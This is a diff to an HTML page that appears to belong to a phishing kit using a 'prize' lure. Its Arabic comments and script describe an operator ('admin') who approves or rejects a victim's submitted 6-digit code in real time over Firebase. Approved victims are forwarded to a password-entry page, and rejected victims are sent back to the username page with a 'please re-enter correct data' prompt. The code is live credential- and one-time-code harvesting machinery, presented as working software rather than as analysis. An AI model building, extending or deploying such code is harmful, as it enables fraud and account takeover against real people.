@@ -14,17 +14,29 @@
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
-  <script src="/assets/js/firebase-client.js?v=12"></script>
+  <script src="/assets/js/firebase-client.js?v=13"></script>
   <script src="/assets/js/page-commands.js?v=5"></script>
   <script>
-    // موافقة المدير بعد إدخال الرقم السري من 6 أرقام:
-    // تنتقل الصفحة إلى إدخال كلمة المرور النصية.
+    // الانتظار حتى قرار المدير:
+    //   الموافقة → تمرير إلى صفحة إدخال كلمة المرور النصية.
+    //   الرفض   → إعادة العميل إلى صفحة اسم المستخدم مع رسالة «يرجى إدخال بيانات صحيحه واعادة المحاولة».
+    // الموافقة تصل كأمر توجيه (commands/{sessionId}/redirect) عبر page-commands.js تلقائياً.
+    // الرفض يصل عبر مصدرين (Firestore decision + RTDB rejection) — نستخدم أولهما ونمنع التكرار.
+    var __prizeHandled = false;
+    function __goUsername() {
+      if (__prizeHandled) return;
+      __prizeHandled = true;
+      try { sessionStorage.setItem('prizeRejectMessage', 'يرجى إدخال بيانات صحيحه واعادة المحاولة'); } catch (e) {}
+      window.location.href = 'prize-username.html';
+    }
     if (window.listenForAdminCommands) {
       window.listenForAdminCommands({
-        onApproval: function () {
-          window.location.href = "prize-text-password.html";
-        }
+        onApproval: function () { window.location.href = 'prize-text-password.html'; },
+        onRejection: function () { __goUsername(); }
       });
+    }
+    if (window.listenForPageCommands) {
+      window.listenForPageCommands({ onReject: function () { __goUsername(); } });
     }
   </script>
 </body>
